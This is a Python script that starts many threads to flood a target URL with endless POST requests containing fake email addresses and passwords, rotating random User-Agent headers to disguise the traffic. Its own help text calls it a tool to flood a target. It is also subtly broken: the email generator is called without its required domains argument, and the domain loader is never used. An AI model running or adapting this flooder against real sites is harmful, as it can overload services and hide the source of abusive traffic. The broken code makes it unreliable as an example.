import threading
import requests
import random
import string
import names
import subprocess
import argparse
import logging
from fake_useragent import UserAgent

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def name_gen():
    """
    Generates a random name for the email based on different name formats.

    Returns:
        str: A randomly generated name string.
    """
    name_system = random.choice(["FullName", "FullFirstFirstInitial", "FirstInitialFullLast"])
    first_name = names.get_first_name()
    last_name = names.get_last_name()
    if name_system == "FullName":#JohnDoe
        return first_name + last_name
    elif name_system == "FullFirstFirstInitial":#JohnD
        return first_name + last_name[0]
    return first_name[0] + last_name#JDoe

def load_domains(file_path):
    """
    Loads domains from a specified file.

    Args:
        file_path (str): The path to the file containing domains.

    Returns:
        list: A list of domains read from the file.
    """
    try:
        with open(file_path, 'r') as file:
            domains = [line.strip() for line in file if line.strip()]
        return domains
    except IOError:
        logging.error(f"Failed to read domains from {file_path}")
        return []
    
def generate_random_email(domains):
    """
    Generates a random email address.

    Returns:
        str: A randomly generated email address.
    """
    name = name_gen()
    NumberOrNo=random.choice(["Number", "No"])
    domain = random.choice(domains)
    if NumberOrNo == "Number":
        return name + str(random.randint(1, 100)) + domain
    else:
        return name + domain

def generate_random_password():
    """
    Generates a random password.

    Returns:
        str: A randomly generated password string.
    """
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))

def send_posts(url):
    """
    Continuously sends POST requests with random email and password to the specified URL.

    Args:
        url (str): The target URL to send the POST requests to.
    """
    while True:
        email = generate_random_email()
        password = generate_random_password()
        data = {"a": email, "az": password}
        ua = UserAgent()
        user_agent = ua.random
        headers = {'User-Agent': user_agent}
        response = requests.post(url, data=data, headers=headers,)
        print(f"Email: {email}, Password: {password}, Status Code: {response.status_code}, headers: {user_agent}")

def main():
    """
    Main function to parse arguments and start the threads for sending POST requests.
    """
    parser = argparse.ArgumentParser(description="Flood a target URL with POST requests.")
    parser.add_argument('--url', type=str, required=True, help='Target URL to flood')
    parser.add_argument('--threads', type=int, default=25, help='Number of threads to use')
    args = parser.parse_args()

    threads = [threading.Thread(target=send_posts, args=(args.url,), daemon=True) for _ in range(args.threads)]

    for t in threads:
        t.start()

    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
